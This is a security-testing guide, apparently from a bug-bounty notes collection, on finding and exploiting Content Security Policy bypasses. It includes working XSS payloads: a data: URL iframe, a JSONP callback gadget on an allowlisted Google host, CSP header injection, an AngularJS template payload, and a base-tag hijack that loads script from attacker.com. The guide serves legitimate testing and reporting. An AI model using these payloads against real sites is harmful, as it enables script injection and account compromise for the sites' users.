# Content Security Policy (CSP) & CSP Bypass

Content Security Policy (CSP) is a defense-in-depth mechanism that declares which resources a page may fetch or execute — scripts, styles, frames, connections — via response headers or `<meta>` elements. Once enforced, the browser blocks violations, which usually neutralizes naive XSS. Hunting CSP bypasses matters because permissive directives, third-party allowlists, and policy injection turn a "CSP protected" XSS into an exploitable one, keeping the underlying finding at medium–high severity.

Injection payloads themselves: [XSS_Bypass.md](./XSS_Bypass.md) · Main workflow: [Xss.md](./Xss.md)

## Hunting Checklist

1. Capture the CSP: `curl -sI https://target.com | grep -i 'content-security-policy'` (also check `<meta http-equiv="Content-Security-Policy">`).
2. Audit `script-src` / `default-src` for: `*`, `'unsafe-inline'`, `'unsafe-eval'`, `data:`, `blob:`, `http:`, `https:` bare schemes, and `*.` wildcard subdomains.
3. List every allowlisted host and check it for **JavaScript execution gadgets**: JSONP endpoints, `callback=` parameters, AngularJS template injection, uploadable content served with JS MIME type, open redirects on that host.
4. Check for a CDN/host that appears in **both** `script-src` and a place you control (subdomain takeover candidate, user uploads).
5. Test **CSP injection**: does any request parameter, header, or user value get reflected into the CSP header itself?
6. Check `frame-ancestors` / `frame-src` / `object-src` gaps for clickjacking and plugin-based bypasses.
7. Review `base-uri` — if absent, a `<base>` tag injection rewrites the policy's `'self'` anchor.
8. Note `report-uri` / `report-to` — even when execution is blocked, these can exfiltrate data or confirm the policy in use.

## Test Cases & Examples

### Example CSP configuration

```text
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /__cspreport__;
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```

### Key CSP directives

1. **script-src:** allowed sources for JavaScript execution, including inline scripts and external script files.
2. **default-src:** fallback policy for resource loading when a specific fetch directive is absent.
3. **child-src:** allowed sources for web workers and embedded frames.
4. **connect-src:** restricts URLs used by `fetch`, `WebSocket`, `XMLHttpRequest`.
5. **frame-src:** allowed sources for `<frame>` and `<iframe>`.
6. **frame-ancestors:** which sources may embed the current page in `<frame>`, `<iframe>`, `<object>`, `<embed>`.
7. **img-src:** allowed sources for images.
8. **manifest-src:** allowed sources for application manifest files.
9. **media-src:** sources for audio/video.
10. **object-src:** restricts `<object>`, `<embed>`, `<applet>`.
11. **base-uri:** allowed base URLs settable via `<base>`.
12. **form-action:** valid endpoints for `<form>` submissions.
13. **plugin-types:** restricts MIME types of plugins that may be invoked.
14. **sandbox:** applies restrictions (no pop-ups, no script execution, forced same-origin, etc.) to loaded resources.
15. **upgrade-insecure-requests:** instructs browsers to upgrade HTTP requests to HTTPS.

### How CSP works (recap)

CSP restricts sources for active and passive content, prevents inline JavaScript execution, disables `eval()` unless allowed, and limits resource loading to declared origins. Violations are blocked by the browser and optionally reported to `report-uri`.

## Bypass Techniques

### 1. CSP misconfiguration (insecure values)

```text
default-src 'self' *;
```

- `default-src` is the fallback for all fetch directives; the wildcard `*` allows loading resources from any source — the policy provides no real protection.

Another weak policy:

```text
script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js  https://*.gstatic.com/feedback/ https://accounts.google.com;
```

- `'unsafe-inline'` permits inline JavaScript → XSS fires normally.
- `'unsafe-eval'` enables `eval`-based gadgets.
- `data:` allows loading JavaScript from `data:` URLs.

Example exploit:

```html
<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
```

### 2. JSONP-based bypass

JSONP (JSON with Padding) returns executable code wrapped in a callback call to sidestep the Same-Origin Policy. If a JSONP-capable endpoint is allowlisted in `script-src`, its callback parameter becomes an execution gadget:

```text
https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)
```

With `accounts.google.com` in `script-src`, load on the vulnerable page:

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```

Or chained through a redirect-style parameter:

```text
something.example.com?vuln_param=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)
```

JavaScript now executes from an allowlisted external source — CSP bypassed.

### 3. CSP injection

If user input is reflected into the CSP header itself:

```text
example.com?vuln=something_vuln_csp
```

produces:

```text
Content-Security-Policy: script-src something_vuln_csp; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script'; report-uri https://csp.example.com;
```

Manipulating the value (typically via newline/CRLF or directive separators, depending on the sink) lets an attacker rewrite `script-src` to include a malicious domain, enabling external JavaScript execution.

### 4. base-uri hijack

When `base-uri` is missing or permissive, an injected `<base>` tag (e.g. via HTML injection) changes what `'self'` resolves to, so relative script URLs are fetched from the attacker:

```html
<base href="https://attacker.com/">
<script src="/app.js"></script>
```

### 5. Known third-party gadgets

- Allowlisted analytics/CDN hosts with `callback=` parameters (JSONP), AngularJS pages permitting `{{constructor.constructor('alert(1)')()}}` template payloads, and file-upload endpoints on the same allowlisted host served as `text/html`/`application/javascript`. Enumerate every allowlisted host and test each for one of these gadgets.

## Tools & Resources

- Google **CSP Evaluator**: https://csp-evaluator.withgoogle.com (paste a policy, get weakness findings)
- [PortSwigger: CSP bypass & exploiting DOM XSS with CSP](https://portswigger.net/web-security/csp) · [OWASP CSP Cheat Sheet](https://owasp.org/www-project-secure-headers/)
- Header capture: `curl -sI`, Burp response pane; report collector for debugging: temporary `report-to` listener (e.g. requestbin-style)

## Report Tips

- Pair every CSP bypass with the XSS that it unblocks (or state the exact XSS context + blocked attempt + working bypass chain); a bypass without execution is usually policy-hardening, not a vuln.
- Show which check was defeated (directive value, allowlisted gadget, injected header) so the fix is obvious to the developer — include the violating-console-error before/after.
- For JSONP gadgets on third-party domains, note that the allowlist entry itself is the root cause and recommend removing `*`, `'unsafe-inline'`, `data:`, `base-uri` gaps as concrete hardening.
